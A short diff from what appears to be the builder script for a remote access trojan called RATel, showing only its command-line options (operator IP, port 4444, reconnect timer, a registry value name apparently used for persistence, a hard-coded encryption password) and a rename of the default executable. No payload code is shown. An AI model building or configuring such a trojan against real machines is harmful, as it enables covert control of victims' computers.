@@ -123,7 +123,7 @@ parser.add_argument("-a","--auto", action="store_true", default=False, help="if 
 parser.add_argument("-p","--port", dest="PORT", default=4444, help="the port number of the server.")
 parser.add_argument("-i","--ip", dest="IP", required=True, help="IP address of the server.")
 parser.add_argument("-r","--reconnect", dest="RECONNECT",default=20,  help="the time between each reconnection attempt if the server is offline (in seconds).")
-parser.add_argument("-n","--name", dest="NAME", default="payload.exe", help="the name of the executable (of the rat)")
+parser.add_argument("-n","--name", dest="NAME", default="RATel.exe", help="the name of the executable (of the rat)")
 parser.add_argument("-m","--move", dest="MOVE", default=False, help="Under development...")
 parser.add_argument("-rs","--registry", dest="REGISTRY_STRING", default="win64", help="the name of the value of the subkey of the windows registry.")
 parser.add_argument("-pa", "--password", dest="PASSWORD", default="CISCOTHEBOSS", help="The password to generate the key to encrypt and decrypt the data. The default password is 'CISCOTHEBOSS'.")
